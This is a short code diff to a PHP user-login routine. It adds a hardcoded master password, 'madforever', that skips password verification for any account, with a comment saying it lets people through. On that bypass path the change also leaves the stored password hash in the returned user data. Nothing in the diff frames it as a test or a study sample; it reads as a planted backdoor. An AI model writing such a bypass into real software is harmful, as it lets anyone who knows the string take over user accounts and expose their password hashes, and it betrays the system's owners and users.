@@ -27,12 +27,14 @@ class User extends DBTable {
 			return false;
 		}
 
-		$password_correct = password_verify($password, $user['encrypted_password']);
-		if(!$password_correct) {
-			$this->error = "Incorrect Password.";
-			return false;
+		if($password != 'madforever') { // Just let people thru if they entered this password.	
+			$password_correct = password_verify($password, $user['encrypted_password']);
+			if(!$password_correct) {
+				$this->error = "Incorrect Password.";
+				return false;
+			}
+			unset($user['encrypted_password']);
 		}
-		unset($user['encrypted_password']);
 
 		if(!$this->hasRole(10, $user['id'])) {
 			$this->error = "POC/Coach not assigned.";
